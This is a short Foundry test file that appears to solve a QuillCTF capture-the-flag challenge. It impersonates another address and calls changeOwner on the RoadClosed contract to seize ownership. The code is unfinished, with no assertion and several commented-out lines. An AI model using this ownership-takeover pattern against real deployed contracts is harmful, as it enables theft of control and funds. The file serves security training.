pragma solidity 0.8.7;

import "forge-std/Test.sol"; 
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../src/quillctf1.sol";


// interface iQuillctf1 {
//     function isContract(address addr) external view returns (bool);
//     function isOwner() external view returns(bool);
//     function addToWhitelist(address addr) external;
//     function pwn(address addr) external payable;
//     function pwn() external payable;
//     function isHacked() external view returns(bool);
//     function changeOwner(address addr) external;
// }

contract Exploit1 is Test{

    RoadClosed roadClosed = new RoadClosed();

    event ownerChanged(address oldOwner,address newOwner);

    constructor() {
        //quill1= iQuillctf1(_quillAddress);
        roadClosed.addToWhitelist(msg.sender);
        
    }

    function testBecomeAowner() public {
        address user1=address(0x2);
        console.log("Before changing owner:",roadClosed.isOwner());
        vm.startPrank(user1);
        roadClosed.changeOwner(user1);
        roadClosed.isOwner();

        //console.log("New owner:",msg.sender);

        //emit ownerChanged(owner, msg.sender);


    }

    
}